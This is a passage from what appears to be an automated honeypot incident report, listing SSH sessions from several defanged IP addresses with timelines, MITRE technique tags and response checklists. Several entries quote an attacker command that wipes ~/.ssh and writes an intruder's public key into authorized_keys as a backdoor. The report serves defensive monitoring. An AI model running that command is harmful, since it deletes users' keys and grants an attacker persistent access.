| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:04:08` | `cowrie.session.connect` |
| `2026-06-29 15:04:08` | `cowrie.client.version` |
| `2026-06-29 15:04:08` | `cowrie.client.kex` |
| `2026-06-29 15:04:09` | `cowrie.login.success` |
| `2026-06-29 15:04:10` | `cowrie.session.params` |
| `2026-06-29 15:04:10` | `cowrie.command.input` |
| `2026-06-29 15:04:10` | `cowrie.command.failed` |
| `2026-06-29 15:04:10` | `cowrie.log.closed` |
| `2026-06-29 15:04:11` | `cowrie.session.params` |
| `2026-06-29 15:04:11` | `cowrie.command.input` |
| `2026-06-29 15:04:11` | `cowrie.session.file_download` |
| `2026-06-29 15:04:11` | `cowrie.log.closed` |
| `2026-06-29 15:04:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.219.200[.]16` to AbuseIPDB if not already reported
- [ ] Block `200.219.200[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c1b65d17ba9

| Field | Detail |
|---|---|
| **Source IP** | `200.219.200[.]16` |
| **First Seen** | 2026-06-29 15:04 |
| **Last Seen** | 2026-06-29 15:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:04:11` | `cowrie.session.connect` |
| `2026-06-29 15:04:11` | `cowrie.client.version` |
| `2026-06-29 15:04:11` | `cowrie.client.kex` |
| `2026-06-29 15:04:12` | `cowrie.login.success` |
| `2026-06-29 15:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.219.200[.]16` to AbuseIPDB if not already reported
- [ ] Block `200.219.200[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74a6cee45e7e

| Field | Detail |
|---|---|
| **Source IP** | `200.219.200[.]16` |
| **First Seen** | 2026-06-29 15:04 |
| **Last Seen** | 2026-06-29 15:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:04:12` | `cowrie.session.connect` |
| `2026-06-29 15:04:12` | `cowrie.client.version` |
| `2026-06-29 15:04:12` | `cowrie.client.kex` |
| `2026-06-29 15:04:13` | `cowrie.login.success` |
| `2026-06-29 15:04:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.219.200[.]16` to AbuseIPDB if not already reported
- [ ] Block `200.219.200[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efe9dd199d41

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-29 15:08 |
| **Last Seen** | 2026-06-29 15:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:08:35` | `cowrie.session.connect` |
| `2026-06-29 15:08:35` | `cowrie.client.version` |
| `2026-06-29 15:08:35` | `cowrie.client.kex` |
| `2026-06-29 15:08:38` | `cowrie.login.success` |
| `2026-06-29 15:08:40` | `cowrie.session.params` |
| `2026-06-29 15:08:40` | `cowrie.command.input` |
| `2026-06-29 15:08:40` | `cowrie.log.closed` |
| `2026-06-29 15:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9111c743dcb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-29 15:10 |
| **Last Seen** | 2026-06-29 15:10 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:10:03` | `cowrie.session.connect` |
| `2026-06-29 15:10:04` | `cowrie.client.version` |
| `2026-06-29 15:10:04` | `cowrie.client.kex` |
| `2026-06-29 15:10:11` | `cowrie.login.success` |
| `2026-06-29 15:10:14` | `cowrie.session.params` |
| `2026-06-29 15:10:14` | `cowrie.command.input` |
| `2026-06-29 15:10:17` | `cowrie.log.closed` |
| `2026-06-29 15:10:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fab0581e21b0

| Field | Detail |
|---|---|
| **Source IP** | `111.17.199[.]57` |
| **First Seen** | 2026-06-29 15:12 |
| **Last Seen** | 2026-06-29 15:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:12:15` | `cowrie.session.connect` |
| `2026-06-29 15:12:15` | `cowrie.client.version` |
| `2026-06-29 15:12:15` | `cowrie.client.kex` |
| `2026-06-29 15:12:16` | `cowrie.login.success` |
| `2026-06-29 15:12:17` | `cowrie.session.params` |
| `2026-06-29 15:12:17` | `cowrie.command.input` |
| `2026-06-29 15:12:17` | `cowrie.command.failed` |
| `2026-06-29 15:12:18` | `cowrie.log.closed` |
| `2026-06-29 15:12:19` | `cowrie.session.params` |
| `2026-06-29 15:12:19` | `cowrie.command.input` |
| `2026-06-29 15:12:19` | `cowrie.session.file_download` |
| `2026-06-29 15:12:19` | `cowrie.log.closed` |
| `2026-06-29 15:12:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.17.199[.]57` to AbuseIPDB if not already reported
- [ ] Block `111.17.199[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75951584691b

| Field | Detail |
|---|---|
| **Source IP** | `111.17.199[.]57` |
| **First Seen** | 2026-06-29 15:12 |
| **Last Seen** | 2026-06-29 15:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:12:19` | `cowrie.session.connect` |
| `2026-06-29 15:12:19` | `cowrie.client.version` |
| `2026-06-29 15:12:20` | `cowrie.client.kex` |
| `2026-06-29 15:12:21` | `cowrie.login.success` |
| `2026-06-29 15:12:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.17.199[.]57` to AbuseIPDB if not already reported
- [ ] Block `111.17.199[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6dab8cb6b02

| Field | Detail |
|---|---|
| **Source IP** | `111.17.199[.]57` |
| **First Seen** | 2026-06-29 15:12 |
| **Last Seen** | 2026-06-29 15:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:12:21` | `cowrie.session.connect` |
| `2026-06-29 15:12:21` | `cowrie.client.version` |
| `2026-06-29 15:12:22` | `cowrie.client.kex` |
| `2026-06-29 15:12:23` | `cowrie.login.success` |
| `2026-06-29 15:12:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.17.199[.]57` to AbuseIPDB if not already reported
- [ ] Block `111.17.199[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0611d36ecaf4

| Field | Detail |
|---|---|
| **Source IP** | `45.207.196[.]123` |
| **First Seen** | 2026-06-29 15:14 |
| **Last Seen** | 2026-06-29 15:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:14:40` | `cowrie.session.connect` |
| `2026-06-29 15:14:40` | `cowrie.client.version` |
| `2026-06-29 15:14:40` | `cowrie.client.kex` |
| `2026-06-29 15:14:41` | `cowrie.login.success` |
| `2026-06-29 15:14:42` | `cowrie.session.params` |
| `2026-06-29 15:14:42` | `cowrie.command.input` |
| `2026-06-29 15:14:42` | `cowrie.command.failed` |
| `2026-06-29 15:14:43` | `cowrie.log.closed` |
| `2026-06-29 15:14:43` | `cowrie.session.params` |
| `2026-06-29 15:14:43` | `cowrie.command.input` |
| `2026-06-29 15:14:44` | `cowrie.session.file_download` |
| `2026-06-29 15:14:44` | `cowrie.log.closed` |
| `2026-06-29 15:14:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.207.196[.]123` to AbuseIPDB if not already reported
- [ ] Block `45.207.196[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c53856565dd4

| Field | Detail |
|---|---|
| **Source IP** | `45.207.196[.]123` |
| **First Seen** | 2026-06-29 15:14 |
| **Last Seen** | 2026-06-29 15:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:14:44` | `cowrie.session.connect` |
| `2026-06-29 15:14:44` | `cowrie.client.version` |
| `2026-06-29 15:14:44` | `cowrie.client.kex` |
| `2026-06-29 15:14:45` | `cowrie.login.success` |
| `2026-06-29 15:14:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.207.196[.]123` to AbuseIPDB if not already reported
- [ ] Block `45.207.196[.]123` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb55fbba365e

| Field | Detail |
|---|---|
| **Source IP** | `45.207.196[.]123` |
| **First Seen** | 2026-06-29 15:14 |
| **Last Seen** | 2026-06-29 15:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:14:45` | `cowrie.session.connect` |
| `2026-06-29 15:14:45` | `cowrie.client.version` |
| `2026-06-29 15:14:46` | `cowrie.client.kex` |
| `2026-06-29 15:14:46` | `cowrie.login.success` |
| `2026-06-29 15:14:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.207.196[.]123` to AbuseIPDB if not already reported
- [ ] Block `45.207.196[.]123` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-787c7a56f916

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-06-29 15:18 |
| **Last Seen** | 2026-06-29 15:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:18:43` | `cowrie.session.connect` |
| `2026-06-29 15:18:43` | `cowrie.client.version` |
| `2026-06-29 15:18:44` | `cowrie.client.kex` |
| `2026-06-29 15:18:45` | `cowrie.login.success` |
| `2026-06-29 15:18:46` | `cowrie.session.params` |
| `2026-06-29 15:18:46` | `cowrie.command.input` |
| `2026-06-29 15:18:46` | `cowrie.command.failed` |
| `2026-06-29 15:18:46` | `cowrie.log.closed` |
| `2026-06-29 15:18:47` | `cowrie.session.params` |
| `2026-06-29 15:18:47` | `cowrie.command.input` |
| `2026-06-29 15:18:48` | `cowrie.session.file_download` |
| `2026-06-29 15:18:48` | `cowrie.log.closed` |
| `2026-06-29 15:18:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a865d146d2e4

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-06-29 15:18 |
| **Last Seen** | 2026-06-29 15:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:18:48` | `cowrie.session.connect` |
| `2026-06-29 15:18:48` | `cowrie.client.version` |
| `2026-06-29 15:18:48` | `cowrie.client.kex` |
| `2026-06-29 15:18:49` | `cowrie.login.success` |
| `2026-06-29 15:18:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03ec1e9fe1f8

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-06-29 15:18 |
| **Last Seen** | 2026-06-29 15:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:18:50` | `cowrie.session.connect` |
| `2026-06-29 15:18:50` | `cowrie.client.version` |
| `2026-06-29 15:18:50` | `cowrie.client.kex` |
| `2026-06-29 15:18:51` | `cowrie.login.success` |
| `2026-06-29 15:18:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7321e6268455

| Field | Detail |
|---|---|
| **Source IP** | `43.160.246[.]16` |
| **First Seen** | 2026-06-29 15:19 |
| **Last Seen** | 2026-06-29 15:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:19:18` | `cowrie.session.connect` |
| `2026-06-29 15:19:18` | `cowrie.client.version` |
| `2026-06-29 15:19:18` | `cowrie.client.kex` |
| `2026-06-29 15:19:19` | `cowrie.login.success` |
| `2026-06-29 15:19:20` | `cowrie.session.params` |
| `2026-06-29 15:19:20` | `cowrie.command.input` |
| `2026-06-29 15:19:20` | `cowrie.command.failed` |
| `2026-06-29 15:19:21` | `cowrie.log.closed` |
| `2026-06-29 15:19:21` | `cowrie.session.params` |
| `2026-06-29 15:19:21` | `cowrie.command.input` |
| `2026-06-29 15:19:22` | `cowrie.session.file_download` |
| `2026-06-29 15:19:22` | `cowrie.log.closed` |
| `2026-06-29 15:19:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.246[.]16` to AbuseIPDB if not already reported
- [ ] Block `43.160.246[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc2012410f72

| Field | Detail |
|---|---|
| **Source IP** | `43.160.246[.]16` |
| **First Seen** | 2026-06-29 15:19 |
| **Last Seen** | 2026-06-29 15:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:19:22` | `cowrie.session.connect` |
| `2026-06-29 15:19:22` | `cowrie.client.version` |
| `2026-06-29 15:19:22` | `cowrie.client.kex` |
| `2026-06-29 15:19:23` | `cowrie.login.success` |
| `2026-06-29 15:19:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.246[.]16` to AbuseIPDB if not already reported
- [ ] Block `43.160.246[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0a8ea4df13c

| Field | Detail |
|---|---|
| **Source IP** | `43.160.246[.]16` |
| **First Seen** | 2026-06-29 15:19 |
| **Last Seen** | 2026-06-29 15:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:19:24` | `cowrie.session.connect` |
| `2026-06-29 15:19:24` | `cowrie.client.version` |
| `2026-06-29 15:19:24` | `cowrie.client.kex` |
| `2026-06-29 15:19:25` | `cowrie.login.success` |
| `2026-06-29 15:19:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.246[.]16` to AbuseIPDB if not already reported
- [ ] Block `43.160.246[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f4a4527ca9e

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-06-29 15:20 |
| **Last Seen** | 2026-06-29 15:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:20:54` | `cowrie.session.connect` |
| `2026-06-29 15:20:54` | `cowrie.client.version` |
| `2026-06-29 15:20:54` | `cowrie.client.kex` |
| `2026-06-29 15:20:54` | `cowrie.login.success` |
| `2026-06-29 15:20:55` | `cowrie.session.params` |
| `2026-06-29 15:20:55` | `cowrie.command.input` |
| `2026-06-29 15:20:55` | `cowrie.log.closed` |
| `2026-06-29 15:20:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-339d74d9eec9

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-06-29 15:21 |
| **Last Seen** | 2026-06-29 15:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:21:19` | `cowrie.session.connect` |
| `2026-06-29 15:21:19` | `cowrie.client.version` |
| `2026-06-29 15:21:19` | `cowrie.client.kex` |
| `2026-06-29 15:21:19` | `cowrie.login.success` |
| `2026-06-29 15:21:20` | `cowrie.session.params` |
| `2026-06-29 15:21:20` | `cowrie.command.input` |
| `2026-06-29 15:21:20` | `cowrie.command.failed` |
| `2026-06-29 15:21:20` | `cowrie.log.closed` |
| `2026-06-29 15:21:21` | `cowrie.session.params` |
| `2026-06-29 15:21:21` | `cowrie.command.input` |
| `2026-06-29 15:21:21` | `cowrie.session.file_download` |
| `2026-06-29 15:21:21` | `cowrie.log.closed` |
| `2026-06-29 15:21:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1219a37a90f5

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-06-29 15:21 |
| **Last Seen** | 2026-06-29 15:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:21:21` | `cowrie.session.connect` |
| `2026-06-29 15:21:21` | `cowrie.client.version` |
| `2026-06-29 15:21:21` | `cowrie.client.kex` |
| `2026-06-29 15:21:21` | `cowrie.login.success` |
| `2026-06-29 15:21:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-331e42262a1b

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-06-29 15:21 |
| **Last Seen** | 2026-06-29 15:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:21:21` | `cowrie.session.connect` |
| `2026-06-29 15:21:21` | `cowrie.client.version` |
| `2026-06-29 15:21:21` | `cowrie.client.kex` |
| `2026-06-29 15:21:21` | `cowrie.login.success` |
| `2026-06-29 15:21:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa716c4b2836

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
